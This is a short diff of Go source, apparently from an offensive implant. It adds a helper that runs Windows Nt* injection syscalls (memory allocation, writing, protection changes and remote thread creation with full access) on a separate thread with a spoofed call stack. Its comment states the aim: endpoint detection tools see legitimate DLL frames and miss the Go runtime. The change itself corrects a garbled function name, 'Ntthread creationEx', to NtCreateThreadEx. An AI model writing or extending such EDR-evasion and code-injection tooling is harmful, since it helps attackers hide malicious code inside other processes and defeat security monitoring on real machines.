@@ -13,7 +13,7 @@ import (
 
 // apiSpoofState manages a dedicated native thread for executing Nt* syscalls
 // with a spoofed call stack. Injection API calls (NtAllocateVirtualMemory,
-// NtWriteVirtualMemory, NtProtectVirtualMemory, Ntthread creationEx, etc.) are
+// NtWriteVirtualMemory, NtProtectVirtualMemory, NtCreateThreadEx, etc.) are
 // routed through this thread so EDR stack scanners see legitimate DLL frames
 // instead of Go runtime addresses.
 type apiSpoofState struct {
@@ -391,8 +391,8 @@ func SpoofedNtProtectVirtualMemory(processHandle uintptr, baseAddress *uintptr, 
 	)
 }
 
-func SpoofedNtthread creationEx(threadHandle *uintptr, processHandle, startRoutine uintptr) uint32 {
-	return SpoofedSyscall("Ntthread creationEx",
+func SpoofedNtCreateThreadEx(threadHandle *uintptr, processHandle, startRoutine uintptr) uint32 {
+	return SpoofedSyscall("NtCreateThreadEx",
 		uintptr(unsafe.Pointer(threadHandle)),
 		0x1FFFFF, // THREAD_ALL_ACCESS
 		0,        // ObjectAttributes
